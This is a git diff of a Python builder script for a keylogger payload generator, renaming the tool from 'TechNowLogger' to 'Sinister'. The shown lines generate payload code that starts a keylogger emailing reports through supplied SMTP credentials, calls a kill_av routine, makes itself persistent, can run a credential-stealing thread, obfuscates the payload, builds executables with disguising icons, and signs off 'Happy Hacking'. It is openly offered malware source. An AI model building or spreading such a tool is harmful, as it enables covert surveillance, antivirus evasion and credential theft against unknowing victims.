@@ -23,7 +23,7 @@ elif platform.system() == 'Linux':
     WINDOWS_PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v2.2')
+    parser = argparse.ArgumentParser(description=f'{Fore.RED}Sinister v2.3')
     parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
@@ -150,10 +150,10 @@ def create_keylogger(file_name, interval, email, password, time_persistent, smtp
         if arguments.stealer:
             file.write(f"\t\tt1 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
             file.write(f"\t\tt1.start()\n\n")                           #Starting Thread
-        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
-        file.write("\t\ttechnowlogger.kill_av()\n")        
-        file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
-        file.write("\t\ttechnowlogger.start()\n\n")       
+        file.write(f"\t\tSinister = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
+        file.write("\t\tSinister.kill_av()\n")        
+        file.write(f"\t\tSinister.become_persistent({time_persistent})\n")
+        file.write("\t\tSinister.start()\n\n")       
         
         file.write("check_and_start()\n")      #Running/Calling the Functions   
 
@@ -197,20 +197,20 @@ def create_keylogger_binded(file_name, interval, email, password, time_persisten
             file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
             file.write(f"\t\tt2.start()\n\n")                           #Starting Thread
 
-        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
-        file.write("\t\ttechnowlogger.kill_av()\n")        
-        file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
-        file.write("\t\ttechnowlogger.start()\n\n")            
+        file.write(f"\t\tSinister = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
+        file.write("\t\tSinister.kill_av()\n")        
+        file.write(f"\t\tSinister.become_persistent({time_persistent})\n")
+        file.write("\t\tSinister.start()\n\n")            
         file.write("check_and_start()\n") 
 
 def create_keylogger_linux(file_name, interval, email, password, time_persistent, smtp_server, smtp_port):
     with open(file_name, "w+") as file:
         file.write("import keylogger\n")
 
-        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
-        file.write("technowlogger.kill_av()\n")        
-        file.write(f"technowlogger.become_persistent({time_persistent})\n")
-        file.write("technowlogger.start()\n")     
+        file.write(f"Sinister = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
+        file.write("Sinister.kill_av()\n")        
+        file.write(f"Sinister.become_persistent({time_persistent})\n")
+        file.write("Sinister.start()\n")     
         
 def obfuscating_payload(file_name):
     gen = DocumentGenerator()
@@ -266,14 +266,14 @@ def exit_greet():
         os.system('cls')
     except Exception as e:
         os.system('clear')        
-    print(Fore.GREEN + '''Happy Hacking ~TechNowLogger!   \n''' + Style.RESET_ALL)
+    print(Fore.GREEN + '''Happy Hacking ~Sinister!   \n''' + Style.RESET_ALL)
     quit()
     
 if __name__ == '__main__':
     if platform.system() == 'Linux':     
         os.system('rm -Rf dist')
         if not os.geteuid() == 0:
-            sys.exit('Technowlogger must be run as root')         
+            sys.exit('Sinister must be run as root')         
     if platform.system() == 'Windows': 
         dist_folder = os.getcwd() + "/dist"
         try:
@@ -376,14 +376,14 @@ if __name__ == '__main__':
         del_junk_file(arguments.out)
         print(f"{Fore.GREEN}[+] Junk Files Removed Successfully!")
         
-        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}') or os.path.exists(f'~/opt/technowloogger/dist/{arguments.out}.exe') or os.path.exists(f'{os.getcwd()}\\dist\\{arguments.out}.exe'):
+        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}') or os.path.exists(f'~/opt/Sinister/dist/{arguments.out}.exe') or os.path.exists(f'{os.getcwd()}\\dist\\{arguments.out}.exe'):
             print(f"\n{Fore.GREEN}[+] Generated Successfully!\n")
 
             print(f"\n{Fore.RED} :O-) TIP{Fore.YELLOW} : USE ICONS from {Fore.RED}icon{Fore.YELLOW} folder like this >>  {Fore.RED}--icon icon/exe.ico")
 
         else:
             print(f"\n{Fore.RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
-            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/technowlogger\n")                  
+            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/Sinister\n")                  
     
     except KeyboardInterrupt:        
         exit_greet()
